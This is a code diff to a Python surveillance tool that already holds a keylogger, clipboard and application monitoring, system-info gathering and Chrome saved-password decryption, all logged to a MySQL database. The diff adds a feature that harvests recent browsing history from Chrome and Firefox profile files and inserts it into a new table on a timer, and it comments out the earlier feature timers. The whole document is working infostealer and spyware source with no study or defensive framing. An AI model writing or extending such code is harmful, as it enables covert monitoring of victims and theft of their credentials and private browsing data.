@@ -2,7 +2,6 @@ import subprocess
 import os
 import platform
 
-import win32crypt
 
 # Check and install required modules
 required_modules = ['pynput', 'mysql-connector-python', 'pyperclip', 'psutil','pycryptodome','pywin32']
@@ -23,7 +22,7 @@ import socket
 import base64
 import json
 import psutil
-# import win32crypt
+import win32crypt
 from Crypto.Cipher import AES
 from datetime import timezone, datetime, timedelta
 import glob
@@ -100,6 +99,16 @@ CREATE TABLE IF NOT EXISTS chrome_passwords (
 )
 """
 
+# Create the browser_history table if not exists
+create_browser_history_table_query = """
+CREATE TABLE IF NOT EXISTS browser_history (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    url VARCHAR(255) NOT NULL,
+    title VARCHAR(255) NOT NULL,
+    last_visit_time DATETIME NOT NULL
+)
+"""
+
 try:
     cursor.execute(create_keystrokes_table_query)
     cursor.execute(create_clipboard_table_query)
@@ -107,6 +116,7 @@ try:
     cursor.execute(create_system_info_table_query)
     cursor.execute(create_downloads_table_query)
     cursor.execute(create_chrome_passwords_table_query)
+    cursor.execute(create_browser_history_table_query)
 
     db.commit()
 except mysql.connector.Error as err:
@@ -347,35 +357,133 @@ def extract_and_insert_chrome_passwords():
 
 
 
+# Function to extract browser history data
+def extract_browser_history(history_file):
+    connection = None
+
+    try:
+        # Attempt to open the database with a retry mechanism
+        max_retries = 5
+        for retry in range(max_retries):
+            try:
+                connection = sqlite3.connect(history_file)
+                cursor = connection.cursor()
+
+                query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 20;"
+                cursor.execute(query)
+                history_entries = cursor.fetchall()
+
+                extracted_data = []
+                for entry in history_entries:
+                    url, title, last_visit_time = entry
+                    last_visit_time = datetime(1601, 1, 1) + timedelta(microseconds=last_visit_time)
+                    extracted_data.append((url, title, last_visit_time))
+
+                return extracted_data
+
+            except sqlite3.OperationalError as e:
+                if "locked" in str(e).lower():
+                    # Database is locked, retry after a short delay
+                    time.sleep(2)
+                else:
+                    raise  # Re-raise the exception if it's not a database lock issue
+
+    except Exception as e:
+        print(f"Error extracting browser history: {e}")
+        return None
+
+    finally:
+        if connection:
+            connection.close()
+# Function to get browser history file locations
+def get_browser_history_file_location():
+    browser_history_locations = []
+
+    # Chrome
+    chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'History')
+    if os.path.isfile(chrome_path):
+        browser_history_locations.append(chrome_path)
+
+    # Firefox
+    firefox_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
+    if os.path.isdir(firefox_path):
+        profiles = [d for d in os.listdir(firefox_path) if os.path.isdir(os.path.join(firefox_path, d))]
+        for profile in profiles:
+            history_path = os.path.join(firefox_path, profile, 'places.sqlite')
+            if os.path.isfile(history_path):
+                browser_history_locations.append(history_path)
+
+    return browser_history_locations
+
+# Function to insert browser history data into the browser_history table
+def insert_browser_history_data(url, title, last_visit_time):
+    try:
+        query = "INSERT INTO browser_history (url, title, last_visit_time) " \
+                "VALUES (%s, %s, %s)"
+        values = (url, title, last_visit_time)
+        cursor.execute(query, values)
+        db.commit()
+        print(f"Browser history data inserted successfully: {url}")
+    except mysql.connector.Error as err:
+        print(f"Error insert browser history data: {err}")
+        with open("error_log.txt", "a") as error_log:
+            error_log.write(f"{datetime.now()}: {err}\n")
+        pass
+
+# Function to extract and insert browser history into the database
+def extract_and_insert_browser_history():
+    try:
+        browser_history_locations = get_browser_history_file_location()
+
+        for history_file in browser_history_locations:
+            extracted_data = extract_browser_history(history_file)
+
+            if extracted_data:
+                for entry in extracted_data:
+                    url, title, last_visit_time = entry
+                    insert_browser_history_data(url, title, last_visit_time)
+
+    except Exception as e:
+        print(f"Error extracting browser history: {e}")
+
+
+
+
+
 
 # Set the time interval for keylogger data insertion (in seconds)
 interval = 60.0
 
-#Feature : 1
-# Schedule the keylogger to run at the specified interval
-keylogger_timer = Timer(interval, start_keylogger)
-keylogger_timer.start()
-#Feature : 2
-# Start clipboard monitoring
-clipboard_thread = Timer(interval, monitor_clipboard)
-clipboard_thread.start()
-#Feature : 3
-# Start application monitoring
-applications_thread = Timer(interval, monitor_applications)
-applications_thread.start()
-#Feature : 4
-# Schedule the download data insertion to run at the specified interval
-downloads_timer = Timer(interval, get_last_10_downloads)
-downloads_timer.start()
+# #Feature : 1
+# # Schedule the keylogger to run at the specified interval
+# keylogger_timer = Timer(interval, start_keylogger)
+# keylogger_timer.start()
+# #Feature : 2
+# # Start clipboard monitoring
+# clipboard_thread = Timer(interval, monitor_clipboard)
+# clipboard_thread.start()
+# #Feature : 3
+# # Start application monitoring
+# applications_thread = Timer(interval, monitor_applications)
+# applications_thread.start()
+# #Feature : 4
+# # Schedule the download data insertion to run at the specified interval
+# downloads_timer = Timer(interval, get_last_10_downloads)
+# downloads_timer.start()
+#
+# #Feature : 5
+# # Gather system information at the beginning
+# gather_system_info()
+# # Schedule the system info gathering to run at a longer interval
+# system_info_timer = Timer(3600.0, gather_system_info)
+# system_info_timer.start()
+#
+# #Feature : 6
+# # Schedule the chrome passwords extraction and insertion to run at the specified interval
+# chrome_passwords_timer = Timer(interval, extract_and_insert_chrome_passwords)
+# chrome_passwords_timer.start()
 
-#Feature : 5
-# Gather system information at the beginning
-gather_system_info()
-# Schedule the system info gathering to run at a longer interval
-system_info_timer = Timer(3600.0, gather_system_info)
-system_info_timer.start()
-
-#Feature 6
-# Schedule the chrome passwords extraction and insertion to run at the specified interval
-chrome_passwords_timer = Timer(interval, extract_and_insert_chrome_passwords)
-chrome_passwords_timer.start()
+#Feature : 7
+# Schedule the browser history extraction and insertion to run at the specified interval
+browser_history_timer = Timer(interval, extract_and_insert_browser_history)
+browser_history_timer.start()
